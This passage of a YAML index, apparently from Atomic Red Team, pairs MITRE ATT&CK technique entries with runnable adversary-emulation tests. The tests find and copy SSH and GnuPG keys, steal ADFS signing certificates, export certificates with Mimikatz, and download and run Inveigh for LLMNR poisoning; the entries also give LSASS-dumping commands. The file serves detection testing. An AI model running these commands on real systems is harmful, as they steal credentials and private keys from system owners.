      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_contributors:
      - Alex Spivakovsky, Pentera
      - Andrew Allen, @whitehat_zero
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5
      created: '2022-03-24T19:30:56.727Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1557/003
        external_id: T1557.003
      - source_name: rfc2131
        description: Droms, R. (1997, March). Dynamic Host Configuration Protocol.
          Retrieved March 9, 2022.
        url: https://datatracker.ietf.org/doc/html/rfc2131
      - source_name: new_rogue_DHCP_serv_malware
        description: Irwin, Ullrich, J. (2009, March 16). new rogue-DHCP server malware.
          Retrieved January 14, 2022.
        url: https://isc.sans.edu/forums/diary/new+rogueDHCP+server+malware/6025/
      - source_name: rfc3315
        description: J. Bound, et al. (2003, July). Dynamic Host Configuration Protocol
          for IPv6 (DHCPv6). Retrieved June 27, 2022.
        url: https://datatracker.ietf.org/doc/html/rfc3315
      - source_name: dhcp_serv_op_events
        description: Microsoft. (2006, August 31).  DHCP Server Operational Events.
          Retrieved March 7, 2022.
        url: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800668(v=ws.11)
      - source_name: solution_monitor_dhcp_scopes
        description: 'Shoemaker, E. (2015, December 31). Solution: Monitor DHCP Scopes
          and Detect Man-in-the-Middle Attacks with PRTG and PowerShell. Retrieved
          March 7, 2022.'
        url: https://lockstepgroup.com/blog/monitor-dhcp-scopes-and-detect-man-in-the-middle-attacks/
      - source_name: w32.tidserv.g
        description: Symantec. (2009, March 22). W32.Tidserv.G. Retrieved January
          14, 2022.
        url: https://web.archive.org/web/20150923175837/http://www.symantec.com/security_response/writeup.jsp?docid=2009-032211-2952-99&tabid=2
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1552.004:
    technique:
      modified: '2023-04-12T23:52:08.194Z'
      name: 'Unsecured Credentials: Private Keys'
      description: "Adversaries may search for private key certificate files on compromised
        systems for insecurely stored credentials. Private cryptographic keys and
        certificates are used for authentication, encryption/decryption, and digital
        signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate
        file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer,
        .p7b, .asc. \n\nAdversaries may also look in common key directories, such
        as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code>
        on Windows. Adversary tools may also search compromised systems for file extensions
        relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation:
        Palo Alto Prince of Persia)\n\nWhen a device is registered to Azure AD, a
        device key and a transport key are generated and used to verify the device‚Äôs
        identity.(Citation: Microsoft Primary Refresh Token) An adversary with access
        to the device may be able to export the keys in order to impersonate the device.(Citation:
        AADInternals Azure AD Device Identities)\n\nOn network devices, private keys
        may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome
        private keys require a password or passphrase for operation, so an adversary
        may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for
        keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110)
        the passphrase off-line. These private keys can be used to authenticate to
        [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for
        use in decrypting other collected files such as email."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Itzik Kotler, SafeBreach
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: Monitor access to files and directories related to cryptographic
        keys and certificates as a means for potentially detecting access patterns
        that may indicate collection and exfiltration activity. Collect authentication
        logs and look for potentially abnormal activity that may indicate improper
        use of keys or certificates for remote authentication. For network infrastructure
        devices, collect AAA logging to monitor for private keys being exported.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      type: attack-pattern
      id: attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf
      created: '2020-02-04T13:06:49.258Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1552/004
        external_id: T1552.004
      - source_name: Palo Alto Prince of Persia
        description: Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia
          ‚Äì Game Over. Retrieved July 5, 2017.
        url: https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/
      - source_name: cisco_deploy_rsa_keys
        description: 'Cisco. (2023, February 17). Chapter: Deploying RSA Keys Within
          a PKI . Retrieved March 27, 2023.'
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_conn_pki/configuration/xe-17/sec-pki-xe-17-book/sec-deploy-rsa-pki.html#GUID-1CB802D8-9DE3-447F-BECE-CF22F5E11436
      - source_name: AADInternals Azure AD Device Identities
        description: Dr. Nestori Syynimaa. (2022, February 15). Stealing and faking
          Azure AD device identities. Retrieved February 21, 2023.
        url: https://aadinternals.com/post/deviceidentity/
      - source_name: Kaspersky Careto
        description: Kaspersky Labs. (2014, February 11). Unveiling ‚ÄúCareto‚Ä? - The
          Masked APT. Retrieved July 5, 2017.
        url: https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf
      - source_name: Microsoft Primary Refresh Token
        description: Microsoft. (2022, September 9). What is a Primary Refresh Token?.
          Retrieved February 21, 2023.
        url: https://learn.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token
      - source_name: Wikipedia Public Key Crypto
        description: Wikipedia. (2017, June 29). Public-key cryptography. Retrieved
          July 5, 2017.
        url: https://en.wikipedia.org/wiki/Public-key_cryptography
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1552.004
    atomic_tests:
    - name: Private Keys
      auto_generated_guid: 520ce462-7ca7-441e-b5a5-f8347f632696
      description: |
        Find private keys on the Windows file system.
        File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc
      supported_platforms:
      - windows
      executor:
        command: 'dir c:\ /b /s .key | findstr /e .key

          '
        name: command_prompt
        elevation_required: true
    - name: Discover Private SSH Keys
      auto_generated_guid: 46959285-906d-40fa-9437-5a439accd878
      description: 'Discover private SSH keys on a macOS or Linux system.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        search_path:
          description: Path where to start searching from.
          type: path
          default: "/"
        output_file:
          description: Output file containing locations of SSH key files
          type: path
          default: "/tmp/keyfile_locations.txt"
      executor:
        command: |
          find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
          exit 0
        cleanup_command: 'rm #{output_file}

          '
        name: sh
    - name: Copy Private SSH Keys with CP
      auto_generated_guid: 7c247dc7-5128-4643-907b-73a76d9135c3
      description: 'Copy private SSH keys on a Linux system to a staging folder using
        the `cp` command.

        '
      supported_platforms:
      - linux
      input_arguments:
        search_path:
          description: Path where to start searching from.
          type: path
          default: "/"
        output_folder:
          description: Output folder containing copies of SSH private key files
          type: path
          default: "/tmp/art-staging"
      executor:
        command: |
          mkdir #{output_folder}
          find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \;
          exit 0
        cleanup_command: 'rm -rf #{output_folder}

          '
        name: sh
    - name: Copy Private SSH Keys with rsync
      auto_generated_guid: 864bb0b2-6bb5-489a-b43b-a77b3a16d68a
      description: 'Copy private SSH keys on a Linux or macOS system to a staging
        folder using the `rsync` command.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        search_path:
          description: Path where to start searching from.
          type: path
          default: "/"
        output_folder:
          description: Output folder containing copies of SSH private key files
          type: path
          default: "/tmp/art-staging"
      executor:
        command: |
          mkdir #{output_folder}
          find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;
          exit 0
        cleanup_command: 'rm -rf #{output_folder}

          '
        name: sh
    - name: Copy the users GnuPG directory with rsync
      auto_generated_guid: 2a5a0601-f5fb-4e2e-aa09-73282ae6afca
      description: 'Copy the users GnuPG (.gnupg) directory on a Mac or Linux system
        to a staging folder using the `rsync` command.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        search_path:
          description: Path where to start searching from
          type: path
          default: "/"
        output_folder:
          description: Output folder containing a copy of the .gnupg directory
          type: path
          default: "/tmp/GnuPG"
      executor:
        command: |
          mkdir #{output_folder}
          find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
          exit 0
        cleanup_command: 'rm -rf #{output_folder}

          '
        name: sh
    - name: ADFS token signing and encryption certificates theft - Local
      auto_generated_guid: 78e95057-d429-4e66-8f82-0f060c1ac96f
      description: |
        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'AADInternals module must be installed.

          '
        prereq_command: 'if (Get-Module AADInternals) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Install-Module -Name AADInternals -Force

          '
      executor:
        command: |
          Import-Module AADInternals -Force
          Export-AADIntADFSCertificates
          Get-ChildItem | Where-Object {$_ -like "ADFS*"}
          Write-Host "`nCertificates retrieved successfully"
        cleanup_command: |
          Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
          Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
        name: powershell
    - name: ADFS token signing and encryption certificates theft - Remote
      auto_generated_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
      description: |
        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
      supported_platforms:
      - windows
      input_arguments:
        adfs_service_account_name:
          description: Name of the ADFS service account
          type: string
          default: adfs_svc
        replication_user:
          description: Username with replication rights. It can be the Domain Admin
            running the script
          type: string
          default: Administrator
        replication_password:
          description: Password of replication_username
          type: string
          default: ReallyStrongPassword
        adfs_server_name:
          description: Name of an ADFS server
          type: string
          default: sts.contoso.com
      dependency_executor_name: powershell
      dependencies:
      - description: 'AADInternals and ActiveDirectory modules must be installed.

          '
        prereq_command: 'if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable
          -Name ActiveDirectory)) {echo 0} else {echo 1}

          '
        get_prereq_command: 'Install-Module -Name AADInternals -Force

          '
      executor:
        command: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals
          -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc
          = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object
          name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString
          -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object
          -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user},
          $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash
          = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential
          -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration
          -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get
          certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group =
          $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container
          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent
          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base
          = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter
          = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\")
          | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"]
          \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\")
          | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne()
          \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted
          certificates from configuration and decrypt them\nExport-AADIntADFSCertificates
          -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like
          \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
        cleanup_command: |
          Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
          Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
        name: powershell
    - name: CertUtil ExportPFX
      auto_generated_guid: 336b25bf-4514-4684-8924-474974f28137
      description: |
        The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.
        Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
        Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
        Reference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html
      supported_platforms:
      - windows
      input_arguments:
        output:
          description: file path to export to
          type: path
          default: c:\temp\atomic.pfx
        password:
          description: password for cert
          type: string
          default: password
      executor:
        command: "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1'
          -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400
          #{output}\n"
        cleanup_command: "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint
          -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n"
        name: powershell
        elevation_required: true
    - name: Export Root Certificate with Export-PFXCertificate
      auto_generated_guid: 7617f689-bbd8-44bc-adcd-6f8968897848
      description: |
        Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.
        Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.
      supported_platforms:
      - windows
      input_arguments:
        pfx_path:
          description: output path of the certificate
          type: string
          default: "$env:Temp\\atomicredteam.pfx"
      executor:
        command: |
          $mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText
          $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
          Set-Location Cert:\LocalMachine\My
          Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd
        cleanup_command: |
          try {
          $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
          Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
          } catch { }
        name: powershell
        elevation_required: true
    - name: Export Root Certificate with Export-Certificate
      auto_generated_guid: 78b274f8-acb0-428b-b1f7-7b0d0e73330a
      description: |
        Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.
        Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.
      supported_platforms:
      - windows
      input_arguments:
        pfx_path:
          description: Path of the certificate
          type: path
          default: "$env:Temp\\AtomicRedTeam.cer"
      executor:
        command: |
          $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
          Set-Location Cert:\LocalMachine\My
          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
        cleanup_command: |
          try {
             $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
             Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
             Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
          }
          catch { }
        name: powershell
        elevation_required: true
    - name: Export Certificates with Mimikatz
      auto_generated_guid: 290df60e-4b5d-4a5e-b0c7-dc5348ea0c86
      description: |
        The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
        A successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.
      supported_platforms:
      - windows
      input_arguments:
        mimikatz_exe:
          description: Path of the Mimikatz binary
          type: string
          default: PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})

          '
        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"
          -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl
          = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path #{mimikatz_exe}
          | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
      executor:
        command: '#{mimikatz_exe} "crypto::certificates /systemstore:local_machine
          /store:my /export"  exit

          '
        name: command_prompt
        elevation_required: true
  T1557.001:
    technique:
      modified: '2022-10-25T15:46:55.393Z'
      name: 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay'
      description: "By responding to LLMNR/NBT-NS network traffic, adversaries may
        spoof an authoritative source for name resolution to force communication with
        an adversary controlled system. This activity may be used to collect or relay
        authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR)
        and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve
        as alternate methods of host identification. LLMNR is based upon the Domain
        Name System (DNS) format and allows hosts on the same local link to perform
        name resolution for other hosts. NBT-NS identifies systems on a local network
        by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries
        can spoof an authoritative source for name resolution on a victim network
        by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know
        the identity of the requested host, effectively poisoning the service so that
        the victims will communicate with the adversary controlled system. If the
        requested host belongs to a resource that requires identification/authentication,
        the username and NTLMv2 hash will then be sent to the adversary controlled
        system. The adversary can then collect the hash information sent over the
        wire through tools that monitor the ports for traffic or through [Network
        Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes
        offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to
        obtain the plaintext passwords.\n\nIn some cases where an adversary has access
        to a system that is in the authentication path between systems or when automated
        scans that use credentials attempt to authenticate to an adversary controlled
        system, the NTLMv1/v2 hashes can be intercepted and relayed to access and
        execute code against a target system. The relay step can happen in conjunction
        with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM
        Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may
        encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB,
        MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.¬†\n\nSeveral
        tools may be used to poison name services within local networks such as NBNSpoof,
        Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation:
        GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: |-
        Monitor <code>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient</code> for changes to the "EnableMulticast" DWORD value. A value of ‚Äú0‚Ä? indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)

        Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.

        Deploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)
      x_mitre_platforms:
      - Windows
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.4'
      x_mitre_contributors:
      - Eric Kuehn, Secure Ideas
      - Matthew Demaske, Adaptforward
      - Andrew Allen, @whitehat_zero
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      - 'Service: Service Creation'
      type: attack-pattern
      id: attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e
      created: '2020-02-11T19:08:51.677Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1557/001
        external_id: T1557.001
      - source_name: Rapid7 LLMNR Spoofer
        description: Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.
        url: https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response
      - source_name: GitHub Responder
        description: Gaffie, L. (2016, August 25). Responder. Retrieved November 17,
          2017.
        url: https://github.com/SpiderLabs/Responder
      - source_name: Secure Ideas SMB Relay
        description: Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays
          Should Be On Your Mind. Retrieved February 7, 2019.
        url: https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html
      - source_name: TechNet NetBIOS
        description: Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November
          17, 2017.
        url: https://technet.microsoft.com/library/cc958811.aspx
      - source_name: GitHub NBNSpoof
        description: Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.
        url: https://github.com/nomex/nbnspoof
      - source_name: GitHub Conveigh
        description: Robertson, K. (2016, August 28). Conveigh. Retrieved November
          17, 2017.
        url: https://github.com/Kevin-Robertson/Conveigh
      - source_name: byt3bl33d3r NTLM Relaying
        description: Salvati, M. (2017, June 2). Practical guide to NTLM Relaying
          in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February
          7, 2019.
        url: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
      - source_name: Sternsecurity LLMNR-NBTNS
        description: 'Sternstein, J. (2013, November). Local Network Attacks: LLMNR
          and NBT-NS Poisoning. Retrieved November 17, 2017.'
        url: https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning
      - source_name: Wikipedia LLMNR
        description: Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution.
          Retrieved November 17, 2017.
        url: https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.0.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1557.001
    atomic_tests:
    - name: LLMNR Poisoning with Inveigh (PowerShell)
      auto_generated_guid: deecd55f-afe0-4a62-9fba-4d1ba2deb321
      description: Inveigh conducts spoofing attacks and hash/credential captures
        through both packet sniffing and protocol specific listeners/sockets. This
        Atomic will run continuously until you cancel it or it times out.
      supported_platforms:
      - windows
      executor:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
          Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
        name: powershell
        elevation_required: true
  T1003.001:
    technique:
      modified: '2023-04-03T18:54:21.492Z'
      name: 'OS Credential Dumping: LSASS Memory'
      description: |
        Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

        As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

        For example, on the target host use procdump:

        * <code>procdump -ma lsass.exe lsass_dump</code>

        Locally, mimikatz can be run using:

        * <code>sekurlsa::Minidump lsassdump.dmp</code>
        * <code>sekurlsa::logonPasswords</code>

        Built-in Windows tools such as comsvcs.dll can also be used:

        * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)


        Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

        The following SSPs can be used to access credentials:

        * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
        * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
        * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
        * CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Edward Millington
      - Ed Williams, Trustwave, SpiderLabs
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.

        On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

        Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Process: Process Access'
      - 'Process: OS API Execution'
      type: attack-pattern
      id: attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90
      created: '2020-02-11T18:41:44.783Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1003/001
        external_id: T1003.001
      - source_name: Medium Detecting Attempts to Steal Passwords from Memory
        description: French, D. (2018, October 2). Detecting Attempts to Steal Passwords
          from Memory. Retrieved October 11, 2019.
        url: https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea
      - source_name: Graeber 2014
        description: Graeber, M. (2014, October). Analysis of Malicious Security Support
          Provider DLLs. Retrieved March 1, 2017.
        url: http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html
      - source_name: Volexity Exchange Marauder March 2021
        description: 'Gruzweig, J. et al. (2021, March 2). Operation Exchange Marauder:
          Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities.
          Retrieved March 3, 2021.'
        url: https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
      - source_name: Powersploit
        description: PowerSploit. (n.d.). Retrieved December 4, 2014.
        url: https://github.com/mattifestation/PowerSploit
